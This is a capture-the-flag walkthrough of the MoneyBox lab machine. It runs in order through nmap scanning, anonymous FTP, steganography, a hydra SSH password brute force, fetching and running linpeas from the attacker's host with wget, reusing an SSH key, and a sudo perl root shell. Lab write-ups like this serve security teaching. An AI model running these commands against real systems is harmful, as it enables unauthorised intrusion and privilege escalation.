# MoneyBox Walkthrough
Hello There, 

This is f33z and i am here to share my walkthrough On how i Got root access to the machine MoneyBox in the play section of proving grounds, which means it does also belong to Vulnhub

## Port Scanning
We run Nmap as usual to find open ports : 
```bash
nmap -p- -T4 -v [IP-ADDRESS]
```
- -p- : for scanning all ports 0-65,535
- -T4 : for Quick Scan T1-T5
- -v : for verbose mode

We got that there is two open port 21,22,80 to check their services and their version, we run the command 
```bash
nmap -p21,22,80 -sC -sV [IP-ADDRESS]
```
this screen shows the we have the services FTP, SSH, HTTP for the followings 21,22,80 ports

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/502374f7-7579-42fe-9597-3e53c10ad690)

## Enumeration
### 21 Port - FTP
Since we can log in to FTP using anonymous access, we found an image named `trytofind.jpg`

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/ac4f71f0-45e3-4d5b-bfdb-b592d960bcb0)


this version of FTP `vsFTPd 3.0.3` does not seem to have an exploitable vulnerability, accourding to the results of this command :
```bash
searchsploit vsFTPd 3.*
```
### 80 Port - HTTP

the IP Address displays this web page, this indicates that this machine is more CTF-like, so we can think like if we are solving CTFs instead of focusing on realistic attacks only

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/0634847f-4cf3-4fcc-a146-c03c4f0015a8)

After running a Directory brute force on this web page we found that there is /blog directory
```bash
dirsearch -u http://IP-ADDRESS/
```
![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/db451dc3-0475-4dae-9d1e-118565906f3c)

In the source code of this page, we found 
```html
<!--the hint is the another secret directory is S3cr3t-T3xt-->
```

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/ac6191d4-ad37-4b04-b32a-036801830715)

when we navigate to /blog/S3cr3t-T3xt directory, we found this page 

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/4f6388a4-58e8-4bc2-9fa1-5f4eea018b93)

this page also had this `<!..Secret Key 3xtr4ctd4t4 >` hidden in its source code 

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/5a142371-df80-4cef-9060-440fb5625325)


## Initial Access
Since this box is a CTF-like Box, and after our enumeration we did find a JPG image and a key `3xtr4ctd4t4`, we will try some steganography on this image, since it is JPG image, we can use steghide and since we have a key, we can try that key as passphrase to stehide
```bash
steghide extract -sf trytofind.jpg
```

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/5dc2c4f8-3499-4f5c-8391-318cc786abc8)

This hint indicats that the password of the user `renu` is easy to brute force, we can use hydra to bruteforce it on the service SSH
```bash
hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://[IP-ADDRESS] -t 10
```


![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/5478486f-358b-43c8-95d0-8a4c4a539f58)

We found quickly this easy password : `987654321`

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/29705a8a-5eb8-4250-9623-f633435773e7)

## Privilege Escalation

After gaining access to the moneyBox machine as renu user, we will try to escalate our privileges, to do so, we run linpeas on the target machine, 

in my kali machine :
```bash
python3 -m http.server 80
```

in the moneyBox machine 
```bash
cd /tmp
wget http://[IP-ADDRESS-kali]/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

After going through the output of linpeas we get some intresting commands that were related to ssh and the user lily


![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/dedad9c9-8105-4872-a408-c139722638e8)

we make sure we can access access ssh using the user lily, i checked the file authorized keys in the .ssh directory inside the home directory of renu 
and i found that lily can access ssh using the same private key that renu uses :


![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/b2724f9c-1100-4300-a340-a39b6c011b5f)

doing so i got a access with priviliges of the user lily, 


![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/ad9026e8-0fd7-462e-865e-d01d0fda4fd1)

running the command `sudo -l` shows that i can run the command perl with sudo permissions without password, using the [GTFObins](https://gtfobins.github.io/gtfobins/perl/#sudo) website i can run this command to get root privileges :

```bash
sudo perl -e 'exec "/bin/sh";'
```

And Yes we are again GROOT!!!

![image](https://github.com/F33-Z/Walkthroughs/assets/73140750/4e6dfdb9-2751-4bf1-b123-69118b492e76)








